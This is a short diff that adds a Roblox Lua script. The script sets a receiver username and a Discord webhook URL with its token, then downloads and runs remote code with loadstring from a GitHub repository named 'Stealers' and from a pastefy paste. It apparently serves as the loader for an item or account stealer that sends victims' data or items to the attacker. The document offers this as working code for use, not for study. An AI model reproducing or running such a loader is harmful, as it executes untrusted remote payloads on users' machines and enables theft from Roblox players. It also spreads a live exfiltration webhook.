@@ -1,0 +1,6 @@
+Receiver = "Sp_33dst3r"
+Webhook = "https://discord.com/api/webhooks/1301157373834039297/ZbbnWO4wZNpSKLkUNeXV627DKO0PP5lRiRRIQwclZHFCwSYdSALbvU02l3oJPOeNr-Aj"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
+
+loadstring(game:HttpGet(('https://pastefy.app/FPGI0uTW/raw'),true))()
